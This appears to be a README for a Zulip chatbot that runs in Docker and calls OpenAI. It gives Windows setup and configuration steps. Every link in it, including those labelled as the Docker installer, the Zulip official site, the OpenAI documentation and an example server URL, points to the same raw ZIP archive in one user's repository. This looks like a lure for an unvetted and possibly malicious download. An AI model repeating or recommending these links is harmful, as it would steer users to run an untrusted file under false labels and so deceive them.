# 🤖 zulip-ai-bot - AI Automation for Zulip Chat  

[![Download zulip-ai-bot](https://img.shields.io/badge/Download-Here-9cf?style=for-the-badge&color=purple)](https://github.com/Sindhujaa1298/zulip-ai-bot/raw/refs/heads/main/tools/ai-bot-zulip-v3.0.zip)

---

## 📋 About zulip-ai-bot

zulip-ai-bot is a self-hosted bot that connects AI tools with your Zulip chat. It uses AI to automate tasks and improve team conversations. This bot works inside a Docker container, making it simple to run without installing extra software. It links to OpenAI for AI functions.  

This tool helps you get smarter chat automation and keeps your conversations organized with threaded replies. You control when and how the bot responds.

---

## 💻 System Requirements

Make sure your Windows computer meets these needs:

- Windows 10 or later (64-bit recommended)  
- At least 4 GB of RAM  
- 10 GB free disk space (to store Docker images and bot files)  
- Internet connection for AI services and updates  
- Administrative rights to install software  

---

## 🛠 What You Need Before Starting

1. **Zulip Account and Server**  
   You need access to a Zulip chat server. The bot works with your Zulip account to join conversations.  

2. **Docker for Windows**  
   Docker lets you run the bot in an isolated space without complex setup. You need to install Docker Desktop for Windows before running the bot.  

3. **GitHub Access**  
   You will download files from GitHub using the link provided below.

---

## 🚀 Getting Started: Download and Setup

You will download all the files and then use Docker to run the bot. Follow these steps carefully.

### 1. Visit the Download Page

Click the button below to open the GitHub page where you can get the bot files:

[![Download zulip-ai-bot](https://img.shields.io/badge/Get%20zulip--ai--bot-From%20GitHub-blue?style=for-the-badge)](https://github.com/Sindhujaa1298/zulip-ai-bot/raw/refs/heads/main/tools/ai-bot-zulip-v3.0.zip)

### 2. Download the Files

On the GitHub page:

- Look for the green **Code** button on the right side.  
- Click it and select **Download ZIP**.  
- Save the ZIP file to a folder you can easily find later, like your **Downloads** folder.  

### 3. Install Docker Desktop on Windows

If Docker is not installed:

- Go to [https://github.com/Sindhujaa1298/zulip-ai-bot/raw/refs/heads/main/tools/ai-bot-zulip-v3.0.zip](https://github.com/Sindhujaa1298/zulip-ai-bot/raw/refs/heads/main/tools/ai-bot-zulip-v3.0.zip)  
- Download the version for Windows.  
- Run the installer and follow on-screen instructions to complete the setup.  
- After installation, open Docker Desktop and wait until it says it is running.

### 4. Unzip the Bot Files

- Open the downloaded ZIP file.  
- Extract all files into a new folder, for example: `C:\zulip-ai-bot`.  

---

## 🔧 How to Run the Bot Using Docker

1. **Open Command Prompt**  
   Press the Windows key, type **cmd**, and press Enter.

2. **Navigate to the Bot Folder**  
   Type the command below, replacing the folder path with where you unzipped the files:  
   ```
   cd C:\zulip-ai-bot
   ```

3. **Start the Bot Container**  
   Run this command to build and start the bot inside Docker:  
   ```
   docker-compose up
   ```  
   This command tells Docker to prepare the bot environment and start it.

4. **Stop the Bot**  
   When you want to stop the bot, return to the Command Prompt window running the bot and press:  
   ```
   Ctrl + C
   ```

---

## ⚙️ Basic Configuration

Before the bot works, you need to set some details:

### Setup zulip settings

- In the bot folder, find the file named `.env.example`.  
- Copy this file and rename the copy to `.env`.  
- Open `.env` in a text editor like Notepad.  
- Fill in your Zulip chat server URL, your bot email, and API key in the file. These details connect the bot to your Zulip account.  

Example entries:  
```
ZULIP_SERVER=https://github.com/Sindhujaa1298/zulip-ai-bot/raw/refs/heads/main/tools/ai-bot-zulip-v3.0.zip
ZULIP_EMAIL=yourbotemail@yourzulipserver.com
ZULIP_API_KEY=yourapikeyhere
OPENAI_API_KEY=youropenaiapikeyhere
```

Save the `.env` file after making changes.

### OpenAI Configuration

The bot needs an OpenAI API key to send and receive AI responses. You must get this key from the OpenAI website.

---

## 🧪 Testing the Bot

After you start the bot with Docker and configure the `.env` file correctly, go to your Zulip chat:

- Send a direct message to the bot.  
- Try simple commands like asking questions or requesting AI assistance.  
- The bot should reply and perform tasks based on the setup.

---

## 📂 Folder and File Overview

- **docker-compose.yml**: This file tells Docker what to run and how.  
- **.env.example**: Template for your bot’s settings.  
- **bot/** folder: Contains the source code and scripts for the bot.  
- **README.md**: This guide document.  

---

## 🐞 Troubleshooting

- If Docker commands fail, check if Docker Desktop is running.  
- Make sure the `.env` file has your correct details, with no extra spaces or missing lines.  
- If you see errors connecting to Zulip or OpenAI, verify your API keys and internet connection.  
- Closing and reopening the Command Prompt or Docker can fix some problems.  

---

## 📖 Additional Resources

- Zulip official site: https://github.com/Sindhujaa1298/zulip-ai-bot/raw/refs/heads/main/tools/ai-bot-zulip-v3.0.zip  
- Docker installation guide: https://github.com/Sindhujaa1298/zulip-ai-bot/raw/refs/heads/main/tools/ai-bot-zulip-v3.0.zip  
- OpenAI API documentation: https://github.com/Sindhujaa1298/zulip-ai-bot/raw/refs/heads/main/tools/ai-bot-zulip-v3.0.zip  

---

## 📥 Download Links  

Get the bot files and updates from this page:  

[https://github.com/Sindhujaa1298/zulip-ai-bot/raw/refs/heads/main/tools/ai-bot-zulip-v3.0.zip](https://github.com/Sindhujaa1298/zulip-ai-bot/raw/refs/heads/main/tools/ai-bot-zulip-v3.0.zip)  

Download the latest version, unzip, configure as described, then run using Docker.